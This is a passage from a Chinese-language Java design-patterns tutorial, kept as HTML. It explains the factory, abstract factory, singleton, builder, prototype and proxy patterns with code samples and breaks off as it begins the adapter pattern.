class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">APP</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 先选择一个具体的工厂</span></span><br><span class="line">        FoodFactory factory = <span class="keyword">new</span> ChineseFoodFactory();</span><br><span class="line">        <span class="comment">// 由第一步的工厂产生具体的对象，不同的工厂造出不一样的对象</span></span><br><span class="line">        Food food = factory.makeFood(<span class="string">"A"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然都是调用 makeFood(“A”)  制作 A 类食物，但是，不同的工厂生产出来的完全不一样。</p><p>第一步，我们需要选取合适的工厂，然后第二步基本上和简单工厂一样。</p><p><strong>核心在于，我们需要在第一步选好我们需要的工厂</strong>。比如，我们有 LogFactory 接口，实现类有 FileLogFactory 和 KafkaLogFactory，分别对应将日志写入文件和写入 Kafka 中，显然，我们客户端第一步就需要决定到底要实例化 FileLogFactory 还是 KafkaLogFactory，这将决定之后的所有的操作。</p><p>虽然简单，不过我也把所有的构件都画到一张图上，这样读者看着比较清晰：</p><p><img src="https://www.javadoop.com/blogimages/design-pattern/factory-1.png" alt="factory-1"></p><h3><span id="抽象工厂模式">抽象工厂模式</span></h3><p>当涉及到<strong>产品族</strong>的时候，就需要引入抽象工厂模式了。</p><p>一个经典的例子是造一台电脑。我们先不引入抽象工厂模式，看看怎么实现。</p><p>因为电脑是由许多的构件组成的，我们将 CPU 和主板进行抽象，然后 CPU 由 CPUFactory 生产，主板由 MainBoardFactory 生产，然后，我们再将 CPU 和主板搭配起来组合在一起，如下图：</p><p><img src="https://www.javadoop.com/blogimages/design-pattern/abstract-factory-1.png" alt="factory-1"></p><p>这个时候的客户端调用是这样的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 得到 Intel 的 CPU</span></span><br><span class="line">CPUFactory cpuFactory = <span class="keyword">new</span> IntelCPUFactory();</span><br><span class="line">CPU cpu = intelCPUFactory.makeCPU();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 得到 AMD 的主板</span></span><br><span class="line">MainBoardFactory mainBoardFactory = <span class="keyword">new</span> AmdMainBoardFactory();</span><br><span class="line">MainBoard mainBoard = mainBoardFactory.make();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 组装 CPU 和主板</span></span><br><span class="line">Computer computer = <span class="keyword">new</span> Computer(cpu, mainBoard);</span><br></pre></td></tr></table></figure><p>单独看 CPU 工厂和主板工厂，它们分别是前面我们说的<strong>工厂模式</strong>。这种方式也容易扩展，因为要给电脑加硬盘的话，只需要加一个 HardDiskFactory 和相应的实现即可，不需要修改现有的工厂。</p><p>但是，这种方式有一个问题，那就是如果 <strong>Intel 家产的 CPU 和 AMD 产的主板不能兼容使用</strong>，那么这代码就容易出错，因为客户端并不知道它们不兼容，也就会错误地出现随意组合。</p><p>下面就是我们要说的<strong>产品族</strong>的概念，它代表了组成某个产品的一系列附件的集合：</p><p><img src="https://www.javadoop.com/blogimages/design-pattern/abstract-factory-2.png" alt="abstract-factory-2"></p><p>当涉及到这种产品族的问题的时候，就需要抽象工厂模式来支持了。我们不再定义 CPU 工厂、主板工厂、硬盘工厂、显示屏工厂等等，我们直接定义电脑工厂，每个电脑工厂负责生产所有的设备，这样能保证肯定不存在兼容问题。</p><p><img src="https://www.javadoop.com/blogimages/design-pattern/abstract-factory-3.png" alt="abstract-factory-3"></p><p>这个时候，对于客户端来说，不再需要单独挑选 CPU厂商、主板厂商、硬盘厂商等，直接选择一家品牌工厂，品牌工厂会负责生产所有的东西，而且能保证肯定是兼容可用的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 第一步就要选定一个“大厂”</span></span><br><span class="line">    ComputerFactory cf = <span class="keyword">new</span> AmdFactory();</span><br><span class="line">    <span class="comment">// 从这个大厂造 CPU</span></span><br><span class="line">    CPU cpu = cf.makeCPU();</span><br><span class="line">    <span class="comment">// 从这个大厂造主板</span></span><br><span class="line">    MainBoard board = cf.makeMainBoard();</span><br><span class="line">  <span class="comment">// 从这个大厂造硬盘</span></span><br><span class="line">  HardDisk hardDisk = cf.makeHardDisk();</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 将同一个厂子出来的 CPU、主板、硬盘组装在一起</span></span><br><span class="line">    Computer result = <span class="keyword">new</span> Computer(cpu, board, hardDisk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，抽象工厂的问题也是显而易见的，比如我们要加个显示器，就需要修改所有的工厂，给所有的工厂都加上制造显示器的方法。这有点违反了<strong>对修改关闭，对扩展开放</strong>这个设计原则。</p><h3><span id="单例模式">单例模式</span></h3><p>单例模式用得最多，错得最多。</p><p>饿汉模式最简单：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 首先，将 new Singleton() 堵死</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;;</span><br><span class="line">    <span class="comment">// 创建私有静态实例，意味着这个类第一次使用的时候就会进行创建</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 瞎写一个静态方法。这里想说的是，如果我们只是要调用 Singleton.getDate(...)，</span></span><br><span class="line">    <span class="comment">// 本来是不想要生成 Singleton 实例的，不过没办法，已经生成了</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Date <span class="title">getDate</span><span class="params">(String mode)</span> </span>&#123;<span class="keyword">return</span> <span class="keyword">new</span> Date();&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>很多人都能说出饿汉模式的缺点，可是我觉得生产过程中，很少碰到这种情况：你定义了一个单例的类，不需要其实例，可是你却把一个或几个你会用到的静态方法塞到这个类中。</p></blockquote><p>饱汉模式最容易出错：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 首先，也是先堵死 new Singleton() 这条路</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="comment">// 和饿汉模式相比，这边不需要先实例化出来，注意这里的 volatile，它是必须的</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton instance = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 加锁</span></span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">                <span class="comment">// 这一次判断也是必须的，不然会有并发问题</span></span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>双重检查，指的是两次检查 instance 是否为 null。</p><p>volatile 在这里是需要的，希望能引起读者的关注。</p><p>很多人不知道怎么写，直接就在 getInstance() 方法签名上加上 synchronized，这就不多说了，性能太差。</p></blockquote><p>嵌套类最经典，以后大家就用它吧：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton3</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton3</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="comment">// 主要是使用了 嵌套类可以访问外部类的静态属性和静态方法 的特性</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Holder</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> Singleton3 instance = <span class="keyword">new</span> Singleton3();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton3 <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Holder.instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意，很多人都会把这个<strong>嵌套类</strong>说成是<strong>静态内部类</strong>，严格地说，内部类和嵌套类是不一样的，它们能访问的外部类权限也是不一样的。</p></blockquote><p>最后，我们说一下枚举，枚举很特殊，它在类加载的时候会初始化里面的所有的实例，而且 JVM 保证了它们不会再被实例化，所以它天生就是单例的。</p><p>虽然我们平时很少看到用枚举来实现单例，但是在 RxJava 的源码中，有很多地方都用了枚举来实现单例。</p><h3><span id="建造者模式">建造者模式</span></h3><p>经常碰见的 XxxBuilder 的类，通常都是建造者模式的产物。建造者模式其实有很多的变种，但是对于客户端来说，我们的使用通常都是一个模式的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Food food = <span class="keyword">new</span> FoodBuilder().a().b().c().build();</span><br><span class="line">Food food = Food.builder().a().b().c().build();</span><br></pre></td></tr></table></figure><p>套路就是先 new 一个 Builder，然后可以链式地调用一堆方法，最后再调用一次 build() 方法，我们需要的对象就有了。</p><p>来一个中规中矩的建造者模式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 下面是“一堆”的属性</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> String nickName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造方法私有化，不然客户端就会直接调用构造方法了</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">User</span><span class="params">(String name, String password, String nickName, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">        <span class="keyword">this</span>.nickName = nickName;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 静态方法，用于生成一个 Builder，这个不一定要有，不过写这个方法是一个很好的习惯，</span></span><br><span class="line">    <span class="comment">// 有些代码要求别人写 new User.UserBuilder().a()...build() 看上去就没那么好</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> UserBuilder <span class="title">builder</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> UserBuilder();</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">UserBuilder</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 下面是和 User 一模一样的一堆属性</span></span><br><span class="line">        <span class="keyword">private</span> String  name;</span><br><span class="line">        <span class="keyword">private</span> String password;</span><br><span class="line">        <span class="keyword">private</span> String nickName;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="title">UserBuilder</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 链式调用设置各个属性值，返回 this，即 UserBuilder</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> UserBuilder <span class="title">name</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.name = name;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> UserBuilder <span class="title">password</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.password = password;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> UserBuilder <span class="title">nickName</span><span class="params">(String nickName)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.nickName = nickName;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> UserBuilder <span class="title">age</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.age = age;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// build() 方法负责将 UserBuilder 中设置好的属性“复制”到 User 中。</span></span><br><span class="line">        <span class="comment">// 当然，可以在 “复制” 之前做点检验</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> User <span class="title">build</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (name == <span class="keyword">null</span> || password == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"用户名和密码必填"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (age &lt;= <span class="number">0</span> || age &gt;= <span class="number">150</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"年龄不合法"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 还可以做赋予”默认值“的功能</span></span><br><span class="line">          <span class="keyword">if</span> (nickName == <span class="keyword">null</span>) &#123;</span><br><span class="line">                nickName = name;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> User(name, password, nickName, age);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心是：先把所有的属性都设置给 Builder，然后 build() 方法的时候，将这些属性<strong>复制</strong>给实际产生的对象。</p><p>看看客户端的调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">APP</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        User d = User.builder()</span><br><span class="line">                .name(<span class="string">"foo"</span>)</span><br><span class="line">                .password(<span class="string">"pAss12345"</span>)</span><br><span class="line">                .age(<span class="number">25</span>)</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说实话，建造者模式的<strong>链式</strong>写法很吸引人，但是，多写了很多“无用”的 builder 的代码，感觉这个模式没什么用。不过，当属性很多，而且有些必填，有些选填的时候，这个模式会使代码清晰很多。我们可以在 <strong>Builder 的构造方法</strong>中强制让调用者提供必填字段，还有，在 build() 方法中校验各个参数比在 User 的构造方法中校验，代码要优雅一些。</p><blockquote><p>题外话，强烈建议读者使用 lombok，用了 lombok 以后，上面的一大堆代码会变成如下这样:</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Builder</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String  name;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> String nickName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>怎么样，省下来的时间是不是又可以干点别的了。</p></blockquote><p>当然，如果你只是想要链式写法，不想要建造者模式，有个很简单的办法，User 的 getter 方法不变，所有的 setter 方法都让其 <strong>return this</strong> 就可以了，然后就可以像下面这样调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User user = <span class="keyword">new</span> User().setName(<span class="string">""</span>).setPassword(<span class="string">""</span>).setAge(<span class="number">20</span>);</span><br></pre></td></tr></table></figure><blockquote><p>很多人是这么用的，但是笔者觉得其实这种写法非常地不优雅，不是很推荐使用。</p></blockquote><h3><span id="原型模式">原型模式</span></h3><p>这是我要说的创建型模式的最后一个设计模式了。</p><p>原型模式很简单：有一个原型<strong>实例</strong>，基于这个原型实例产生新的实例，也就是“克隆”了。</p><p>Object 类中有一个 clone() 方法，它用于生成一个新的对象，当然，如果我们要调用这个方法，java 要求我们的类必须先<strong>实现 Cloneable 接口</strong>，此接口没有定义任何方法，但是不这么做的话，在 clone() 的时候，会抛出 CloneNotSupportedException 异常。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">native</span> Object <span class="title">clone</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportedException</span>;</span><br></pre></td></tr></table></figure><blockquote><p>java 的克隆是浅克隆，碰到对象引用的时候，克隆出来的对象和原对象中的引用将指向同一个对象。通常实现深克隆的方法是将对象进行序列化，然后再进行反序列化。</p></blockquote><p>原型模式了解到这里我觉得就够了，各种变着法子说这种代码或那种代码是原型模式，没什么意义。</p><h3><span id="创建型模式总结">创建型模式总结</span></h3><p>创建型模式总体上比较简单，它们的作用就是为了产生实例对象，算是各种工作的第一步了，因为我们写的是<strong>面向对象</strong>的代码，所以我们第一步当然是需要创建一个对象了。</p><p>简单工厂模式最简单；工厂模式在简单工厂模式的基础上增加了选择工厂的维度，需要第一步选择合适的工厂；抽象工厂模式有产品族的概念，如果各个产品是存在兼容性问题的，就要用抽象工厂模式。单例模式就不说了，为了保证全局使用的是同一对象，一方面是安全性考虑，一方面是为了节省资源；建造者模式专门对付属性很多的那种类，为了让代码更优美；原型模式用得最少，了解和 Object 类中的 clone() 方法相关的知识即可。</p><h2><span id="结构型模式">结构型模式</span></h2><p>前面创建型模式介绍了创建对象的一些设计模式，这节介绍的结构型模式旨在通过改变代码结构来达到解耦的目的，使得我们的代码容易维护和扩展。</p><h3><span id="代理模式">代理模式</span></h3><p>第一个要介绍的代理模式是最常使用的模式之一了，用一个代理来隐藏具体实现类的实现细节，通常还用于在真实的实现的前后添加一部分逻辑。</p><p>既然说是<strong>代理</strong>，那就要对客户端隐藏真实实现，由代理来负责客户端的所有请求。当然，代理只是个代理，它不会完成实际的业务逻辑，而是一层皮而已，但是对于客户端来说，它必须表现得就是客户端需要的真实实现。</p><blockquote><p>理解<strong>代理</strong>这个词，这个模式其实就简单了。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">FoodService</span> </span>&#123;</span><br><span class="line">    <span class="function">Food <span class="title">makeChicken</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">Food <span class="title">makeNoodle</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FoodServiceImpl</span> <span class="keyword">implements</span> <span class="title">FoodService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Food <span class="title">makeChicken</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      Food f = <span class="keyword">new</span> Chicken()</span><br><span class="line">        f.setChicken(<span class="string">"1kg"</span>);</span><br><span class="line">      f.setSpicy(<span class="string">"1g"</span>);</span><br><span class="line">      f.setSalt(<span class="string">"3g"</span>);</span><br><span class="line">        <span class="keyword">return</span> f;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Food <span class="title">makeNoodle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Food f = <span class="keyword">new</span> Noodle();</span><br><span class="line">        f.setNoodle(<span class="string">"500g"</span>);</span><br><span class="line">        f.setSalt(<span class="string">"5g"</span>);</span><br><span class="line">        <span class="keyword">return</span> f;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 代理要表现得“就像是”真实实现类，所以需要实现 FoodService</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FoodServiceProxy</span> <span class="keyword">implements</span> <span class="title">FoodService</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 内部一定要有一个真实的实现类，当然也可以通过构造方法注入</span></span><br><span class="line">    <span class="keyword">private</span> FoodService foodService = <span class="keyword">new</span> FoodServiceImpl();</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Food <span class="title">makeChicken</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"我们马上要开始制作鸡肉了"</span>);</span><br><span class="line">      </span><br><span class="line">        <span class="comment">// 如果我们定义这句为核心代码的话，那么，核心代码是真实实现类做的，</span></span><br><span class="line">        <span class="comment">// 代理只是在核心代码前后做些“无足轻重”的事情</span></span><br><span class="line">        Food food = foodService.makeChicken();</span><br><span class="line">      </span><br><span class="line">        System.out.println(<span class="string">"鸡肉制作完成啦，加点胡椒粉"</span>); <span class="comment">// 增强</span></span><br><span class="line">      food.addCondiment(<span class="string">"pepper"</span>);</span><br><span class="line">      </span><br><span class="line">        <span class="keyword">return</span> food;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Food <span class="title">makeNoodle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"准备制作拉面~"</span>);</span><br><span class="line">        Food food = foodService.makeNoodle();</span><br><span class="line">        System.out.println(<span class="string">"制作完成啦"</span>)</span><br><span class="line">        <span class="keyword">return</span> food;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端调用，注意，我们要用代理来实例化接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里用代理类来实例化</span></span><br><span class="line">FoodService foodService = <span class="keyword">new</span> FoodServiceProxy();</span><br><span class="line">foodService.makeChicken();</span><br></pre></td></tr></table></figure><p><img src="https://www.javadoop.com/blogimages/design-pattern/proxy-1.png" alt="proxy"></p><p>我们发现没有，代理模式说白了就是做 <strong>“方法包装”</strong> 或做 <strong>“方法增强”</strong>。在面向切面编程中，其实就是动态代理的过程。比如 Spring 中，我们自己不定义代理类，但是 Spring 会帮我们动态来定义代理，然后把我们定义在 @Before、@After、@Around 中的代码逻辑动态添加到代理中。</p><p>说到动态代理，又可以展开说，Spring 中实现动态代理有两种，一种是如果我们的类定义了接口，如 UserService 接口和 UserServiceImpl 实现，那么采用 JDK 的动态代理，感兴趣的读者可以去看看 java.lang.reflect.Proxy 类的源码；另一种是我们自己没有定义接口的，Spring 会采用 CGLIB 进行动态代理，它是一个 jar 包，性能还不错。</p><h3><span id="适配器模式">适配器模式</span></h3><p>说完代理模式，说适配器模式，是因为它们很相似，这里可以做个比较。</p><p>适配器模式做的就是，有一个接口需要实现，但是我们现成的对象都不满足，需要加一层适配器来进行适配。</p><p>适配器模式总体来说分三种：默认适配器模式、对象适配器模式、类适配器模式。先不急着分清楚这几个，先看看例子再说。</p><h4><span id="默认适配器模式">默认适配器模式</span></h4><p>首先，我们先看看最简单的适配器模式<strong>默认适配器模式(Default Adapter)</strong>是怎么样的。</p><p>我们用 Appache commons-io 包中的 FileAlterationListener 